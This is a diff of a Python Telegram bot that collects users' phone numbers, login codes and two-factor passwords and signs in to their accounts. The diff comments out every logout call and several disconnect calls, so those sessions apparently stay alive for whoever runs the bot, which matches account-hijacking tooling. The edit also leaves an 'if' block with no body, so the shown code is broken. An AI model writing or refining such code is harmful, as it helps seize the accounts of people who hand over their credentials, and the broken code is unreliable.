@@ -152,7 +152,7 @@ async def get_phone_number(message: types.Message, state: FSMContext):
         
         # Разлогиниваемся от предыдущего клиента, если он был авторизован
         if await client.is_user_authorized():
-            await client.log_out()
+            #await client.log_out()
         
         sent_code = await client.send_code_request(phone_number)
         user_state[message.from_user.id] = {
@@ -199,7 +199,7 @@ async def get_code(message: types.Message):
         if user_state[message.from_user.id]['code_attempts'] >= 3:
             await message.answer("Превышено количество попыток ввода кода. Перезапусти меня")
             user_state.pop(message.from_user.id, None)
-            await client.log_out()
+            #await client.log_out()
             await client.disconnect()
         else:
             await message.answer(f"Неверный ПИН-код. Попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
@@ -208,8 +208,8 @@ async def get_code(message: types.Message):
     finally:
         if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
             if 'code_attempts' not in user_state.get(message.from_user.id, {}):
-                await client.log_out()
-                await client.disconnect()
+                #await client.log_out()
+                #await client.disconnect()
                 
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
@@ -240,8 +240,8 @@ async def process_password(message: types.Message):
         await message.answer(f"Произошла ошибка: {e}")
     finally:
         if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
-            await client.log_out()
-            await client.disconnect()
+            #await client.log_out()
+            #await client.disconnect()
 
 # Функция для создания нового экземпляра клиента
 def create_client():
